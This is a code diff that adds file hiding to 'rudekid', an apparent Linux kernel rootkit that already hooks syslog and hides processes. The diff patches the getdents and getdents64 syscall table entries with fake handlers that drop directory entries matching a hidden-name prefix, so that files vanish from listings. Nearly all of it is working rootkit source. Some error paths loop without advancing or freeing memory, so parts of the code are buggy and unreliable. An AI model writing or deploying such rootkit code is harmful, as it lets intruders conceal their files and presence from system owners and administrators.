@@ -21,9 +21,12 @@
 #include <linux/pid_namespace.h>
 #include <linux/ptrace.h>
 
+#include <linux/dirent.h>
+#include <linux/slab.h>
+#include <linux/uaccess.h>
+
 #include <asm/paravirt.h>
 #include <asm/cacheflush.h>
-#include <asm/uaccess.h>
 
 #include "sysmap.h"
 #include "proc_internal.h"
@@ -111,6 +114,7 @@ void unhook_syslog(void)
 
 atomic_t active_hook_calls = ATOMIC_INIT(0);
 
+// FIXME: fdhide
 bool fake__proc_fill_cache( struct file *file,
                             struct dir_context *ctx,
                             const char *name,
@@ -189,10 +193,125 @@ void unhook_prochide(void)
     enable_ro();
 }
 
+struct linux_dirent {
+  unsigned long   d_ino;
+  unsigned long   d_off;
+  unsigned short  d_reclen;
+  char            d_name[1];
+};
+
+/* file hiding */
+asmlinkage int (*real_getdents)(unsigned int, struct linux_dirent*, unsigned int);
+asmlinkage int (*real_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
+
+int shall_hide(char *file_name)
+{
+  char *file_name_tmp = file_name;
+  const char *prefix_tmp = hidden_files;
+
+  while (*prefix_tmp != '\0') {
+    if (*file_name_tmp == '\0' || *file_name_tmp != *prefix_tmp) {
+      return 0;
+    }
+    ++file_name_tmp;
+    ++prefix_tmp;
+  }
+  return 1;
+}
+
+asmlinkage int fake_getdents64( unsigned int fd,
+                                struct linux_dirent64 *dirp,
+                                unsigned int count )
+{
+  int ret;
+  struct linux_dirent64 *cur = dirp;
+  int pos = 0;
+
+  ret = real_getdents64 (fd, dirp, count);
+
+  while (pos < ret) {
+
+    if (shall_hide(cur->d_name)) {
+      int err;
+      int reclen = cur->d_reclen;
+      char *next_rec = (char*)cur + reclen;
+      uintptr_t len = (uintptr_t)dirp + ret - (uintptr_t)next_rec;
+      char *remaining_dirents = kmalloc(len, GFP_KERNEL);
+
+      // modify the memory storing the returned information
+      err = copy_from_user(remaining_dirents, next_rec, len);
+      if (err) {
+        continue;
+      }
+      err = copy_to_user(cur, remaining_dirents, len);
+      if (err) {
+        continue;
+      }
+      kfree(remaining_dirents);
+      // Adjust the return value;
+      ret -= reclen;
+      continue;
+    }
+    // Get the next dirent
+    pos += cur->d_reclen;
+    cur = (struct linux_dirent64*) ((char*)dirp + pos);
+  }
+  return ret;
+}
+
+asmlinkage int fake_getdents(  unsigned int fd,
+                               struct linux_dirent*dirp,
+                               unsigned int count )
+{
+  int ret;
+  struct linux_dirent* cur = dirp;
+  int pos = 0;
+
+  ret = real_getdents(fd, dirp, count);
+  while (pos < ret) {
+
+    if (shall_hide(cur->d_name)) {
+      int reclen = cur->d_reclen;
+      char* next_rec = (char*)cur + reclen;
+      uintptr_t len = (uintptr_t)dirp + ret - (uintptr_t)next_rec;
+      memmove(cur, next_rec, len);
+      ret -= reclen;
+      continue;
+    }
+    pos += cur->d_reclen;
+    cur = (struct linux_dirent*) ((char*)dirp + pos);
+  }
+  return ret;
+}
+
+void hook_filehide(void)
+{
+    disable_ro();
+
+    real_getdents             = syscalls[__NR_getdents];
+    real_getdents64           = syscalls[__NR_getdents64];
+    syscalls[__NR_getdents]   = fake_getdents;
+    syscalls[__NR_getdents64] = fake_getdents64;
+
+    enable_ro();
+}
+
+void unhook_filehide(void)
+{
+    disable_ro();
+
+    syscalls[__NR_getdents]   = real_getdents;
+    syscalls[__NR_getdents64] = real_getdents64;
+
+    enable_ro();
+}
+
+
 int init_module(void){
     printk(KERN_INFO "rudekid loaded.\n");
     hook_syslog();
     hook_prochide();
+    hook_filehide();
 
     return 0;
 }
@@ -202,5 +321,9 @@ void cleanup_module(void){
 
     unhook_syslog();
     unhook_prochide();
+    unhook_filehide();
+
+    while (atomic_read(&active_hook_calls) != 0)
+        msleep(100);
 }
 
